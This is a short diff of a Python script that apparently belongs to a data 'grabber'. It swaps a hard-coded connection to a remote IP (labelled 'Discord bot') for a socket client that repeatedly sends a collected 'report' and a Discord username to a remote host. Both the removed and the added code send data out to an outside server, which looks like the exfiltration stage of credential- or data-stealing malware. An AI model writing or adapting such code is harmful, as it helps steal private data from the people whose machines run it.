@@ -31,7 +31,23 @@ elif grabWanted == 2:
 elif grabWanted == 3:
     # Moar things
 
-sock.connect('34.73.189.184', 9254)
-print('Connected to Discord bot')
-sock.send(report.encode())
-sock.close()
+def run_client(host, port):
+    global report
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # connect to the provided address tuple
+    client.connect((host, port))
+
+    while True:
+        # convert to bytes and send on the socket
+        client.send(report.encode('utf-8'))
+        client.send(discordUser.encode('utf-8'))
+        # read back the response
+        response = client.recv(1024)
+
+        # empty bytes as result of a read means EOF
+        if response == b'':
+            print('remote hung up')
+            break
+
+        # just decode the response and print
+        print(response.decode('utf-8'))
